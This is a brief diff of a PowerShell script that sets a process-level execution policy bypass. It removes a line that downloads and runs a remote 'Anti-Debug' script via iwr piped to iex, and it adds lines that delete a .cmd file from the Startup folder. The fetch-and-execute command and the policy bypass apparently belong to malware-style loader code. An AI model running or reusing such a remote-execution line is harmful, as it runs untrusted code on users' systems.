@@ -4,7 +4,8 @@
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
-iwr https://raw.githubusercontent.com/cossinadevil2k/Powershell-Anti-Debug/main/Best.ps1 -useb |iex
+$filePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows.cmd"
+Remove-Item $filePath -Force
 
 $skid = "skid"
 
